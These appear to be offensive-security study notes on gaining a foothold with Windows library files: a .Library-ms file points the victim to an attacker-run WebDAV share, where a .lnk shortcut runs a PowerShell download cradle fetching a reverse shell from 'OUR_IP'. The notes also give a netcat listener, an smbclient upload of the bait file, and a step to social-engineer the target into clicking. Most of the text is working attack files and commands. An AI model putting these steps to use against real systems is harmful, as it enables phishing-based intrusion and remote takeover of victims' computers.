# Windows Library Files

## Explination

In the first stage, we'll use Windows library files to gain a foothold on the target system and set up the second stage. In the second stage, we'll use the foothold to provide an executable file that will start a reverse shell when double-clicked.

## Execution

First we need to install and setup a WebDAV share. We are using a WebDAV share over something like a simple http server so that it can be rendered in Windows explorer.

```bash
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $(pwd)
```

We will then create the file `config.Library-ms` with the following contents to open the WebDAV share remotely

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://OUR_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

This file will be what we send to the target.

Next we will create a `.lnk` file that will launch our reverse shell. Because `.lnk` files have restricted character lengths, we will use the following command as opposed to the usual base64 encoded payload. We can use the `PowerShell #3 (Base64)` reverse shell from [revshells](https://www.revshells.com/) and place it in the file `hehe.ps1`.

`hehe.ps1` on attack box

```powershell
powershell -e JABjAGwAaQBlAG4AdAA...
```

`automatic_configuration.lnk` path for target to click (more details can be found [here](../../11%20Windows/Windows%20Shells.md))

```powershell
powershell -nop -noni -ep bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://OUR_IP:8000/hehe.ps1')"
```

We will now place `automatic_configuration.lnk` in the directory where we are serving our wsgidav web server so that the target can run it after opening `config.Library-ms`

Before sending the `config.Library-ms` file, we can setup our listeners with the following commands in separate terminals

```bash
python3 -m http.server
```

```bash
rlwrap -cAr nc -lvnp 9001
```

We can then place the `.lnk` within our WebDAV directory, and send `config.Library-ms` to our target and social engineer them into opening `config.Libary-ms` and click on `automatic_configuration.lnk`

One way to do this is through uploading the library to a SMB server via `smbclient`

```bash
smbclient //192.168.1.195/share -c 'put config.Library-ms'
```
